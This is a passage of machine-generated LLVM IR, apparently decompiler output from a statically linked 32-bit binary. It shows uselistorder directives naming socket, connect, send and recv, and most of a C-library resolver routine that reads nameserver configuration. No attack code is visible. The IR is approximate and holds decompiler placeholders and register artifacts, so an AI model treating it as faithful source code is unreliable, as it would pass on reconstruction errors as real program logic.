  %v3_80563f0 = add i32 %v0_80563e5, 228
  %v1_80563f1 = inttoptr i32 %v3_80563f0 to i32*
  %v2_80563f1 = load i32, i32* %v1_80563f1, align 4
  store i32 %v2_80563f1, i32* @edi, align 4
  %v3_80563f1 = add i32 %v0_80563e5, 232
  %v1_80563f2 = inttoptr i32 %v3_80563f1 to i32*
  %v2_80563f2 = load i32, i32* %v1_80563f2, align 4
  store i32 %v2_80563f2, i32* @ebp, align 4
  ret i32 %v3_80563e5

; uselistorder directives
  uselistorder i32 %v0_80563e5, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_80563bc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8056391, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_8056372, { 1, 0 }
  uselistorder i32 %v1_8056379.pre-phi, { 4, 3, 2, 1, 0 }
  uselistorder i16 %stack_var_-192.1, { 1, 0 }
  uselistorder i32 %v0_8056324.pre, { 1, 0 }
  uselistorder i32 %v5_80562f7, { 1, 0 }
  uselistorder i32 %v3_80562f7, { 2, 0, 1, 3 }
  uselistorder i32 %v1_80562bf, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_8056288, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8056256, { 1, 0 }
  uselistorder i32 %v3_8056235, { 1, 0, 2 }
  uselistorder i32 %v0_8056226, { 1, 0 }
  uselistorder i32 %v5_805621c, { 1, 0 }
  uselistorder i32* %v3_805621c, { 1, 0 }
  uselistorder i32 %v0_80560f282, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_805621c, { 2, 1, 0 }
  uselistorder i32 %v5_8056216, { 1, 0 }
  uselistorder i32 %v1_8056215, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8056211, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80561d5, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32 %v7_80561af, { 1, 0 }
  uselistorder i32 %v1_80561a0, { 1, 0 }
  uselistorder i32 %v0_805615f, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_8056106, { 1, 2, 0 }
  uselistorder i32 %v0_8056106, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v5_80560e0, { 1, 0 }
  uselistorder i32 %v1_80560da, { 2, 1, 0, 3 }
  uselistorder i32 %v0_80560d5, { 1, 2, 0 }
  uselistorder i32 %v5_80560e059, { 1, 0 }
  uselistorder i32 %v5_8056082, { 1, 0 }
  uselistorder i32 %v3_8056082, { 2, 0, 1, 3 }
  uselistorder i32 %v3_805603a, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8056020, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_8056020, { 0, 1, 9, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 %v0_8055fff, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8055fdf, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8055f85, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_8055f6a, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v1_8055f53, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8055edb, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8055ec8, { 3, 0, 1, 2 }
  uselistorder i32 %v1_8055e8e, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8055e6f, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_8055e53, { 1, 0 }
  uselistorder i32 %v3_8055e48, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %v0_8055e45, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32 %v0_8055dea, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v0_8055de5, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8055dce, { 1, 0 }
  uselistorder i32 %v1_8055d9a, { 3, 2, 1, 0 }
  uselistorder i32 %v0_8055d8b93, { 2, 1, 0 }
  uselistorder i32 %v3_8055da3, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i16 %v0_8055d4b, { 4, 5, 0, 1, 2, 3, 6 }
  uselistorder i32 %v15_8055d44, { 6, 7, 4, 5, 3, 2, 0, 1, 8, 9, 10, 11, 13, 14, 15, 16, 17, 12 }
  uselistorder i32 %v2_8055cb6, { 8, 5, 3, 9, 10, 4, 7, 11, 0, 1, 2, 6, 12, 13 }
  uselistorder i8** %stack_var_-252, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 78, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 65, 62, 63, 64, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 79, 80, 81, 82, 83, 84 }
  uselistorder i32 248, { 1, 0 }
  uselistorder i32 51, { 2, 1, 0 }
  uselistorder i32 136, { 1, 2, 0 }
  uselistorder i32 132, { 1, 2, 3, 0 }
  uselistorder i32 148, { 1, 2, 0 }
  uselistorder i32 160, { 1, 4, 2, 3, 0 }
  uselistorder i32 68, { 4, 0, 3, 5, 6, 1, 2 }
  uselistorder i32 27, { 2, 3, 1, 0 }
  uselistorder i32 120, { 1, 2, 3, 4, 0 }
  uselistorder i32 67, { 1, 2, 0 }
  uselistorder i32 112, { 1, 5, 6, 7, 3, 4, 2, 0 }
  uselistorder i32 88, { 1, 2, 0 }
  uselistorder i32 72, { 2, 3, 4, 1, 5, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 1, 4, 3, 2, 0 }
  uselistorder i32 10000, { 9, 0, 1, 2, 3, 4, 6, 7, 5, 8 }
  uselistorder i32 228, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 1, 6, 5, 11, 10, 9, 8, 7, 4, 3, 2, 0 }
  uselistorder i32 101, { 0, 2, 3, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 0, 7, 6, 5, 4, 3, 2, 8, 1 }
  uselistorder i32 (i32, i32, i32)* @socket, { 0, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 12 }
  uselistorder i32 17, { 17, 15, 9, 14, 4, 5, 3, 10, 11, 12, 13, 18, 8, 1, 0, 16, 6, 7, 2 }
  uselistorder i32 176, { 2, 3, 4, 1, 0 }
  uselistorder i32 (i32)* @inet_addr, { 1, 5, 4, 3, 2, 0 }
  uselistorder i32 158, { 1, 0 }
  uselistorder i32 156, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 3, 4, 0, 1, 2, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 16, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 41, 42, 38, 39, 40, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32 172, { 1, 2, 3, 0 }
  uselistorder i32 224, { 0, 2, 1 }
  uselistorder i32 220, { 1, 2, 0 }
  uselistorder i32 260, { 2, 1, 0, 3 }
  uselistorder i32 184, { 3, 1, 2, 0 }
  uselistorder i32 ()* @__GI_strncat, { 1, 0 }
  uselistorder i32 200, { 2, 1, 3, 4, 0 }
  uselistorder i32 (i8*, i32, i32)* @strncpy, { 1, 2, 3, 0 }
  uselistorder i32 104, { 3, 0, 4, 2, 1 }
  uselistorder i32 116, { 3, 5, 0, 1, 6, 4, 2 }
  uselistorder i32 84, { 4, 1, 5, 2, 6, 3, 0 }
  uselistorder i32 -12, { 9, 3, 2, 4, 1, 5, 6, 7, 8, 10, 55, 54, 53, 16, 17, 11, 12, 13, 14, 15, 18, 19, 0, 20, 56, 26, 23, 21, 22, 24, 25, 27, 28, 29, 30, 31, 35, 36, 37, 33, 32, 34, 38, 45, 43, 44, 42, 41, 40, 39, 46, 47, 48, 49, 50, 51, 52 }
  uselistorder i32 -8, { 11, 5, 4, 6, 3, 7, 8, 9, 10, 12, 53, 54, 55, 52, 18, 19, 13, 14, 15, 16, 17, 20, 21, 22, 23, 25, 0, 24, 1, 26, 27, 28, 2, 29, 30, 31, 33, 34, 32, 35, 36, 37, 38, 45, 43, 44, 42, 41, 40, 39, 46, 47, 48, 49, 50, 51 }
  uselistorder i32 -16, { 29, 30, 31, 20, 22, 23, 19, 21, 18, 24, 17, 25, 26, 27, 28, 32, 114, 115, 38, 39, 33, 34, 35, 36, 37, 40, 41, 16, 42, 43, 55, 50, 51, 47, 48, 49, 52, 2, 1, 3, 4, 53, 46, 5, 54, 44, 45, 0, 56, 57, 58, 64, 60, 59, 61, 62, 63, 65, 7, 8, 71, 67, 66, 68, 69, 70, 72, 9, 10, 77, 78, 79, 80, 81, 76, 74, 73, 75, 6, 82, 11, 12, 85, 86, 84, 87, 88, 83, 89, 13, 14, 103, 104, 105, 99, 100, 101, 102, 98, 97, 96, 95, 93, 94, 90, 91, 92, 106, 15, 107, 108, 109, 110, 111, 112, 113 }
  uselistorder i16* @global_var_805d444.582, { 2, 1, 0 }
  uselistorder i64 4294967295, { 1, 0, 2 }
  uselistorder i64* @global_var_8063700.581, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_80636e8.580 to i32), { 4, 3, 2, 1, 0 }
  uselistorder i8** @global_var_80636e8.580, { 1, 0 }
  uselistorder i32 1025, { 5, 6, 7, 1, 2, 0, 4, 3 }
  uselistorder i32 512, { 6, 3, 7, 8, 4, 5, 0, 1, 2 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_80563e5, { 1, 0 }
  uselistorder label %dec_label_pc_80563e2, { 1, 0 }
  uselistorder label %dec_label_pc_8056372, { 1, 0 }
  uselistorder label %dec_label_pc_805635c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056349, { 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_8056324.backedge, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_805631c, { 1, 0 }
  uselistorder label %dec_label_pc_8056303, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_80562b8, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_8056256, { 1, 0 }
  uselistorder label %dec_label_pc_8056226, { 5, 2, 6, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_805621c, { 1, 0 }
  uselistorder label %dec_label_pc_8056211, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805620e, { 1, 0 }
  uselistorder label %dec_label_pc_8056189, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80560d1, { 1, 0 }
  uselistorder label %dec_label_pc_8055f53, { 1, 0 }
  uselistorder label %dec_label_pc_8055f1c, { 1, 0 }
  uselistorder label %dec_label_pc_8055e8e, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8055d9a, { 1, 0 }
  uselistorder label %dec_label_pc_8055d84, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %v0_80563f4 = load i32, i32* @ebp, align 4
  store i32 134564459, i32* %stack_var_-216, align 4
  %v3_8056403 = ptrtoint i32* %stack_var_-216 to i32
  %v2_8056408 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8056408, i32* @eax, align 4
  %v2_8056410 = call i32 @__pthread_return_void(i32 %v2_8056408, i32 134564459)
  %v1_805641c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805d448.518 to i32))
  store i32 %v1_805641c, i32* @eax, align 4
  %v0_8056424 = load i32, i32* @global_var_8063b34.519, align 4
  %tmp43 = icmp slt i32 %v0_8056424, 1
  %tmp44 = icmp eq i1 %tmp43, false
  br i1 %tmp44, label %dec_label_pc_805661b, label %dec_label_pc_8056431

dec_label_pc_8056431:                             ; preds = %entry
  store i32 ptrtoint (i32* @global_var_805c930.585 to i32), i32* %stack_var_-216, align 4
  %v2_805643d = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_805c8fe.586 to i32), i32 ptrtoint (i32* @global_var_805c930.585 to i32))
  store i32 %v2_805643d, i32* @eax, align 4
  store i32 %v2_805643d, i32* @ebp, align 4
  %v1_8056447 = icmp eq i32 %v2_805643d, 0
  %v1_8056449 = icmp eq i1 %v1_8056447, false
  br i1 %v1_8056449, label %dec_label_pc_80565e6.preheader, label %dec_label_pc_805644f

dec_label_pc_805644f:                             ; preds = %dec_label_pc_8056431
  store i32 ptrtoint (i32* @global_var_805c930.585 to i32), i32* %stack_var_-216, align 4
  %v2_805645b = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_805c90f.587 to i32), i32 ptrtoint (i32* @global_var_805c930.585 to i32))
  store i32 %v2_805645b, i32* @ebp, align 4
  %v1_8056465 = icmp eq i32 %v2_805645b, 0
  %v1_8056467 = icmp eq i1 %v1_8056465, false
  br i1 %v1_8056467, label %dec_label_pc_80565e6.preheader, label %dec_label_pc_8056610

dec_label_pc_80565e6.preheader:                   ; preds = %dec_label_pc_8056431, %dec_label_pc_805644f
  %v2_80565ed = ptrtoint i32* %stack_var_-180 to i32
  %v3_8056521 = add i32 %v3_8056403, 164
  %v0_80565e6103 = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_80565ed, i32* @ebx, align 4
  %v3_80565f2104 = call i32 @fgets(i32 %v2_80565ed, i32 128, i32 %v0_80565e6103)
  store i32 %v3_80565f2104, i32* @eax, align 4
  %v1_80565fa105 = icmp eq i32 %v3_80565f2104, 0
  %v1_80565fc106 = icmp eq i1 %v1_80565fa105, false
  br i1 %v1_80565fc106, label %dec_label_pc_8056473.preheader.lr.ph, label %dec_label_pc_8056602

dec_label_pc_8056473.preheader.lr.ph:             ; preds = %dec_label_pc_80565e6.preheader
  %v4_805650b = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_8056473.preheader

dec_label_pc_8056472:                             ; preds = %dec_label_pc_805647d
  %v1_8056472 = add i32 %v0_805647257, 1
  store i32 %v1_8056472, i32* @ebx, align 4
  %v1_8056473 = inttoptr i32 %v1_8056472 to i8*
  %v2_8056473 = load i8, i8* %v1_8056473, align 1
  %v3_8056473 = zext i8 %v2_8056473 to i32
  %v5_8056473 = and i32 %v6_805647360, -256
  %v6_8056473 = or i32 %v3_8056473, %v5_8056473
  store i32 %v6_8056473, i32* @ecx, align 4
  %v4_8056475 = icmp eq i8 %v2_8056473, 0
  br i1 %v4_8056475, label %dec_label_pc_80565e6.backedge, label %dec_label_pc_805647d

dec_label_pc_805647d:                             ; preds = %dec_label_pc_805647d.lr.ph, %dec_label_pc_8056472
  %v6_805647360 = phi i32 [ %v6_805647355, %dec_label_pc_805647d.lr.ph ], [ %v6_8056473, %dec_label_pc_8056472 ]
  %v2_805647359 = phi i8 [ %v2_805647352, %dec_label_pc_805647d.lr.ph ], [ %v2_8056473, %dec_label_pc_8056472 ]
  %v1_805647358 = phi i8* [ %v1_805647351, %dec_label_pc_805647d.lr.ph ], [ %v1_8056473, %dec_label_pc_8056472 ]
  %v0_805647257 = phi i32 [ %v0_8056473.pre, %dec_label_pc_805647d.lr.ph ], [ %v1_8056472, %dec_label_pc_8056472 ]
  %v2_805647d = sext i8 %v2_805647359 to i32
  store i32 %v2_805647d, i32* @edx, align 4
  store i32 %v0_8056480.pre, i32* @eax, align 4
  %v2_8056485 = mul nsw i32 %v2_805647d, 2
  %v3_8056485 = add i32 %v0_8056480.pre, %v2_8056485
  %v4_8056485 = inttoptr i32 %v3_8056485 to i8*
  %v5_8056485 = load i8, i8* %v4_8056485, align 1
  %v6_8056485 = and i8 %v5_8056485, 32
  %v7_8056485 = icmp eq i8 %v6_8056485, 0
  %v1_8056489 = icmp eq i1 %v7_8056485, false
  br i1 %v1_8056489, label %dec_label_pc_8056472, label %dec_label_pc_805648b

dec_label_pc_805648b:                             ; preds = %dec_label_pc_805647d
  %v10_805648b = icmp eq i8 %v2_805647359, 10
  br i1 %v10_805648b, label %dec_label_pc_80565e6.backedge, label %dec_label_pc_8056494

dec_label_pc_80565e6.backedge:                    ; preds = %dec_label_pc_8056473.preheader, %dec_label_pc_8056472, %dec_label_pc_80565ac, %dec_label_pc_80565db, %dec_label_pc_80565b3, %dec_label_pc_805648b, %dec_label_pc_8056494, %dec_label_pc_8056565
  %v0_80565e6 = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_80565ed, i32* @ebx, align 4
  %v3_80565f2 = call i32 @fgets(i32 %v2_80565ed, i32 128, i32 %v0_80565e6)
  store i32 %v3_80565f2, i32* @eax, align 4
  %v1_80565fa = icmp eq i32 %v3_80565f2, 0
  %v1_80565fc = icmp eq i1 %v1_80565fa, false
  br i1 %v1_80565fc, label %dec_label_pc_8056473.preheader, label %dec_label_pc_8056602

dec_label_pc_8056494:                             ; preds = %dec_label_pc_805648b
  %v10_805649c = icmp eq i8 %v2_805647359, 35
  %v1_805649f = icmp eq i1 %v10_805649c, false
  br i1 %v1_805649f, label %dec_label_pc_80564f0.preheader, label %dec_label_pc_80565e6.backedge

dec_label_pc_80564f0.preheader:                   ; preds = %dec_label_pc_8056494
  %v2_80564f06 = load i8, i8* %v1_805647358, align 1
  %v3_80564f07 = icmp eq i8 %v2_80564f06, 0
  br i1 %v3_80564f07, label %dec_label_pc_80564fc, label %dec_label_pc_80564f5

dec_label_pc_80564a6:                             ; preds = %dec_label_pc_80564f5
  store i32 %stack_var_-196.013, i32* @eax, align 4
  %v1_80564aa = load i32, i32* @esp, align 4
  %v3_80564aa = mul nuw nsw i32 %stack_var_-196.013, 4
  %v4_80564aa = add nuw nsw i32 %v3_80564aa, 152
  %v5_80564aa = add i32 %v4_80564aa, %v1_80564aa
  %v6_80564aa = inttoptr i32 %v5_80564aa to i32*
  store i32 %v0_80564aa, i32* %v6_80564aa, align 4
  %v0_80564b4.pre = load i32, i32* @ebx, align 4
  %v4_80564b4.pre = load i32, i32* @ecx, align 4
  %v1_80564b461 = inttoptr i32 %v0_80564b4.pre to i8*
  %v2_80564b462 = load i8, i8* %v1_80564b461, align 1
  %v3_80564b463 = zext i8 %v2_80564b462 to i32
  %v5_80564b464 = and i32 %v4_80564b4.pre, -256
  %v6_80564b465 = or i32 %v3_80564b463, %v5_80564b464
  %v4_80564b666 = icmp eq i8 %v2_80564b462, 0
  br i1 %v4_80564b666, label %dec_label_pc_80564d3.preheader, label %dec_label_pc_80564ba.lr.ph

dec_label_pc_80564ba.lr.ph:                       ; preds = %dec_label_pc_80564a6
  %v0_80564bd.pre = load i32, i32* @global_var_805d1e8, align 8
  br label %dec_label_pc_80564ba

dec_label_pc_80564b3:                             ; preds = %dec_label_pc_80564c8
  %v1_80564b3 = add i32 %v0_80564b367, 1
  store i32 %v1_80564b3, i32* @ebx, align 4
  %v1_80564b4 = inttoptr i32 %v1_80564b3 to i8*
  %v2_80564b4 = load i8, i8* %v1_80564b4, align 1
  %v3_80564b4 = zext i8 %v2_80564b4 to i32
  %v5_80564b4 = and i32 %v6_80564b469, -256
  %v6_80564b4 = or i32 %v3_80564b4, %v5_80564b4
  %v4_80564b6 = icmp eq i8 %v2_80564b4, 0
  br i1 %v4_80564b6, label %dec_label_pc_80564d3.preheader, label %dec_label_pc_80564ba

dec_label_pc_80564ba:                             ; preds = %dec_label_pc_80564ba.lr.ph, %dec_label_pc_80564b3
  %v6_80564b469 = phi i32 [ %v6_80564b465, %dec_label_pc_80564ba.lr.ph ], [ %v6_80564b4, %dec_label_pc_80564b3 ]
  %v2_80564b468 = phi i8 [ %v2_80564b462, %dec_label_pc_80564ba.lr.ph ], [ %v2_80564b4, %dec_label_pc_80564b3 ]
  %v0_80564b367 = phi i32 [ %v0_80564b4.pre, %dec_label_pc_80564ba.lr.ph ], [ %v1_80564b3, %dec_label_pc_80564b3 ]
  %v2_80564ba = sext i8 %v2_80564b468 to i32
  store i32 %v2_80564ba, i32* @edx, align 4
  store i32 %v0_80564bd.pre, i32* @eax, align 4
  %v2_80564c2 = mul nsw i32 %v2_80564ba, 2
  %v3_80564c2 = add i32 %v0_80564bd.pre, %v2_80564c2
  %v4_80564c2 = inttoptr i32 %v3_80564c2 to i8*
  %v5_80564c2 = load i8, i8* %v4_80564c2, align 1
  %v6_80564c2 = and i8 %v5_80564c2, 32
  %v7_80564c2 = icmp eq i8 %v6_80564c2, 0
  %v1_80564c6 = icmp eq i1 %v7_80564c2, false
  br i1 %v1_80564c6, label %dec_label_pc_80564d3.preheader, label %dec_label_pc_80564c8

dec_label_pc_80564c8:                             ; preds = %dec_label_pc_80564ba
  %v10_80564c8 = icmp eq i8 %v2_80564b468, 10
  %v1_80564cb = icmp eq i1 %v10_80564c8, false
  br i1 %v1_80564cb, label %dec_label_pc_80564b3, label %dec_label_pc_80564d3.preheader

dec_label_pc_80564d3.preheader:                   ; preds = %dec_label_pc_80564c8, %dec_label_pc_80564ba, %dec_label_pc_80564b3, %dec_label_pc_80564a6
  %v0_80564b3.lcssa = phi i32 [ %v0_80564b4.pre, %dec_label_pc_80564a6 ], [ %v1_80564b3, %dec_label_pc_80564b3 ], [ %v0_80564b367, %dec_label_pc_80564ba ], [ %v0_80564b367, %dec_label_pc_80564c8 ]
  %v6_80564b4.lcssa = phi i32 [ %v6_80564b465, %dec_label_pc_80564a6 ], [ %v6_80564b4, %dec_label_pc_80564b3 ], [ %v6_80564b469, %dec_label_pc_80564ba ], [ %v6_80564b469, %dec_label_pc_80564c8 ]
  %v1_80564d375 = inttoptr i32 %v0_80564b3.lcssa to i8*
  %v2_80564d376 = load i8, i8* %v1_80564d375, align 1
  %v3_80564d377 = zext i8 %v2_80564d376 to i32
  %v5_80564d378 = and i32 %v6_80564b4.lcssa, -256
  %v6_80564d379 = or i32 %v3_80564d377, %v5_80564d378
  store i32 %v6_80564d379, i32* @ecx, align 4
  %v4_80564d580 = icmp eq i8 %v2_80564d376, 0
  br i1 %v4_80564d580, label %dec_label_pc_80564ec, label %dec_label_pc_80564d9

dec_label_pc_80564cf:                             ; preds = %dec_label_pc_80564e7, %dec_label_pc_80564d9
  store i8 0, i8* %v1_80564d382, align 1
  %v0_80564d2 = load i32, i32* @ebx, align 4
  %v1_80564d2 = add i32 %v0_80564d2, 1
  store i32 %v1_80564d2, i32* @ebx, align 4
  %v4_80564d3.pre = load i32, i32* @ecx, align 4
  %v1_80564d3 = inttoptr i32 %v1_80564d2 to i8*
  %v2_80564d3 = load i8, i8* %v1_80564d3, align 1
  %v3_80564d3 = zext i8 %v2_80564d3 to i32
  %v5_80564d3 = and i32 %v4_80564d3.pre, -256
  %v6_80564d3 = or i32 %v3_80564d3, %v5_80564d3
  store i32 %v6_80564d3, i32* @ecx, align 4
  %v4_80564d5 = icmp eq i8 %v2_80564d3, 0
  br i1 %v4_80564d5, label %dec_label_pc_80564ec, label %dec_label_pc_80564d9

dec_label_pc_80564d9:                             ; preds = %dec_label_pc_80564d3.preheader, %dec_label_pc_80564cf
  %v2_80564d383 = phi i8 [ %v2_80564d3, %dec_label_pc_80564cf ], [ %v2_80564d376, %dec_label_pc_80564d3.preheader ]
  %v1_80564d382 = phi i8* [ %v1_80564d3, %dec_label_pc_80564cf ], [ %v1_80564d375, %dec_label_pc_80564d3.preheader ]
  %v0_80564f081 = phi i32 [ %v1_80564d2, %dec_label_pc_80564cf ], [ %v0_80564b3.lcssa, %dec_label_pc_80564d3.preheader ]
  %v2_80564d9 = sext i8 %v2_80564d383 to i32
  store i32 %v2_80564d9, i32* @edx, align 4
  %v0_80564dc = load i32, i32* @global_var_805d1e8, align 8
  store i32 %v0_80564dc, i32* @eax, align 4
  %v2_80564e1 = mul nsw i32 %v2_80564d9, 2
  %v3_80564e1 = add i32 %v0_80564dc, %v2_80564e1
  %v4_80564e1 = inttoptr i32 %v3_80564e1 to i8*
  %v5_80564e1 = load i8, i8* %v4_80564e1, align 1
  %v6_80564e1 = and i8 %v5_80564e1, 32
  %v7_80564e1 = icmp eq i8 %v6_80564e1, 0
  %v1_80564e5 = icmp eq i1 %v7_80564e1, false
  br i1 %v1_80564e5, label %dec_label_pc_80564cf, label %dec_label_pc_80564e7

dec_label_pc_80564e7:                             ; preds = %dec_label_pc_80564d9
  %v10_80564e7 = icmp eq i8 %v2_80564d383, 10
  br i1 %v10_80564e7, label %dec_label_pc_80564cf, label %dec_label_pc_80564ec

dec_label_pc_80564ec:                             ; preds = %dec_label_pc_80564cf, %dec_label_pc_80564e7, %dec_label_pc_80564d3.preheader
  %v0_80564f0.lcssa = phi i32 [ %v0_80564b3.lcssa, %dec_label_pc_80564d3.preheader ], [ %v0_80564f081, %dec_label_pc_80564e7 ], [ %v1_80564d2, %dec_label_pc_80564cf ]
  %v1_80564d3.lcssa = phi i8* [ %v1_80564d375, %dec_label_pc_80564d3.preheader ], [ %v1_80564d382, %dec_label_pc_80564e7 ], [ %v1_80564d3, %dec_label_pc_80564cf ]
  %v4_80564ec = add nuw nsw i32 %stack_var_-196.013, 1
  %v2_80564f0 = load i8, i8* %v1_80564d3.lcssa, align 1
  %v3_80564f0 = icmp eq i8 %v2_80564f0, 0
  br i1 %v3_80564f0, label %dec_label_pc_80564fc, label %dec_label_pc_80564f5

dec_label_pc_80564f5:                             ; preds = %dec_label_pc_80564f0.preheader, %dec_label_pc_80564ec
  %v0_80564aa = phi i32 [ %v0_80564f0.lcssa, %dec_label_pc_80564ec ], [ %v0_805647257, %dec_label_pc_80564f0.preheader ]
  %stack_var_-196.013 = phi i32 [ %v4_80564ec, %dec_label_pc_80564ec ], [ 0, %dec_label_pc_80564f0.preheader ]
  %v7_80564fa = icmp sgt i32 %stack_var_-196.013, 4
  br i1 %v7_80564fa, label %dec_label_pc_80564fc, label %dec_label_pc_80564a6

dec_label_pc_80564fc:                             ; preds = %dec_label_pc_80564ec, %dec_label_pc_80564f5, %dec_label_pc_80564f0.preheader
  %stack_var_-196.0.lcssa = phi i32 [ 0, %dec_label_pc_80564f0.preheader ], [ %v4_80564ec, %dec_label_pc_80564ec ], [ %stack_var_-196.013, %dec_label_pc_80564f5 ]
  store i32 %tmp, i32* @edi, align 4
  %v0_8056503 = load i32, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_805c927.588 to i32), i32* %stack_var_-216, align 4
  %v5_805650b = call i32 @__GI_strcoll(i8* %v4_805650b, i32 ptrtoint ([11 x i8]* @global_var_805c927.588 to i32), i32 %v0_8056503, i32 %v0_8056503)
  store i32 %v5_805650b, i32* @eax, align 4
  store i32 1, i32* @esi, align 4
  %v1_8056518 = icmp eq i32 %v5_805650b, 0
  br i1 %v1_8056518, label %dec_label_pc_8056540.preheader, label %dec_label_pc_8056551

dec_label_pc_8056540.preheader:                   ; preds = %dec_label_pc_80564fc
  %v5_805654490 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_805654490, label %dec_label_pc_8056546.lr.ph, label %dec_label_pc_8056551

dec_label_pc_8056546.lr.ph:                       ; preds = %dec_label_pc_8056540.preheader
  %v0_8056546.pre = load i32, i32* @global_var_8063b34.519, align 4
  br label %dec_label_pc_8056546

dec_label_pc_805651e:                             ; preds = %dec_label_pc_8056546
  %v2_8056521 = mul i32 %v1_805652191, 4
  %v4_8056521 = add i32 %v2_8056521, %v3_8056521
  %v5_8056521 = inttoptr i32 %v4_8056521 to i32*
  %v6_8056521 = load i32, i32* %v5_8056521, align 4
  %v1_8056528 = inttoptr i32 %v6_8056521 to i8*
  %v2_8056528 = call i32 @__GI_strdup(i8* %v1_8056528)
  %v0_805652d = load i32, i32* @esi, align 4
  %v1_805652d = add i32 %v0_805652d, 1
  store i32 %v1_805652d, i32* @esi, align 4
  %v1_805652e = load i32, i32* @ebx, align 4
  %v2_805652e = mul i32 %v1_805652e, 4
  %v3_805652e = add i32 %v2_805652e, 134626088
  %v4_805652e = inttoptr i32 %v3_805652e to i32*
  store i32 %v2_8056528, i32* %v4_805652e, align 4
  %v0_8056535 = load i32, i32* @ebx, align 4
  %v1_8056535 = add i32 %v0_8056535, 1
  store i32 %v1_8056535, i32* @eax, align 4
  store i32 %v1_8056535, i32* @global_var_8063b34.519, align 4
  %v0_8056540.pre = load i32, i32* @esi, align 4
  %v5_8056544 = icmp slt i32 %v0_8056540.pre, %stack_var_-196.0.lcssa
  br i1 %v5_8056544, label %dec_label_pc_8056546, label %dec_label_pc_8056551

dec_label_pc_8056546:                             ; preds = %dec_label_pc_8056546.lr.ph, %dec_label_pc_805651e
  %v0_8056546 = phi i32 [ %v0_8056546.pre, %dec_label_pc_8056546.lr.ph ], [ %v1_8056535, %dec_label_pc_805651e ]
  %v1_805652191 = phi i32 [ 1, %dec_label_pc_8056546.lr.ph ], [ %v0_8056540.pre, %dec_label_pc_805651e ]
  store i32 %v0_8056546, i32* @ebx, align 4
  %v7_805654f = icmp sgt i32 %v0_8056546, 2
  br i1 %v7_805654f, label %dec_label_pc_8056551, label %dec_label_pc_805651e

dec_label_pc_8056551:                             ; preds = %dec_label_pc_8056540.preheader, %dec_label_pc_805651e, %dec_label_pc_8056546, %dec_label_pc_80564fc
  %v0_8056551 = load i32, i32* @ebx, align 4
